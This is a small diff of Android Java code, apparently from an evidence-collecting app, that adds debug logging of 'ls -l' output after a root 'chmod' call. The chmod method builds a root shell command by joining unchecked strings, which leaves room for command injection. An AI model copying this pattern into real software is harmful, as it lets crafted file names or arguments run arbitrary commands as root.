@@ -24,6 +24,7 @@ import com.android.deviceinfo.evidence.EvidenceCollector;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
+import com.android.deviceinfo.util.ExecuteResult;
 
 /**
  * The Class AutoFlashFile.
@@ -423,6 +424,10 @@ public final class AutoFile {
 
 	public void chmod(String string) {
 		Execute.executeRoot("chmod " + string + " " + getFilename() );
+		if (Cfg.DEBUG) {
+			ExecuteResult ret = Execute.executeRoot("ls -l " + getFilename() );
+			Check.log(TAG + " (chmod) result: " + ret.getStdout());
+		}
 	}
 
 }
